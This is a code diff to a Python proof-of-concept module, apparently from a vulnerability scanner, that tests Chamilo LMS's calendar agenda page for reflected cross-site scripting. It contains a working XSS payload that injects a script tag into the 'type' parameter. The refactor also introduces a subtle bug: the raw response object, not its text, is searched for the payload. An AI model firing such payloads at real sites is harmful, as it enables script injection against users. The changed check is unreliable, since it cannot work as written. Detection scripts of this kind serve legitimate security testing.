@@ -2,10 +2,6 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request
-import urllib.error
-import urllib.parse
-
 
 class Vuln(ABVuln):
     vuln_id = 'Chamilo-LMS_0001'  # 平台漏洞编号，留空
@@ -52,13 +48,10 @@ class Poc(ABPoc):
 
             url = self.target + '/main/calendar/agenda_list.php'
             verify_url = url + '?type=personal%27%3E%3Cscript%3Econfirm%281%29%3C%2fscript%3E%3C%21--'
-            request = urllib.request.Request(verify_url)
-            response = urllib.request.urlopen(request)
-
-            content = str(response.read())
+            content = requests.get(verify_url)
             if "<script>confirm(1)</script>" in content:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name,url=verify_url))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
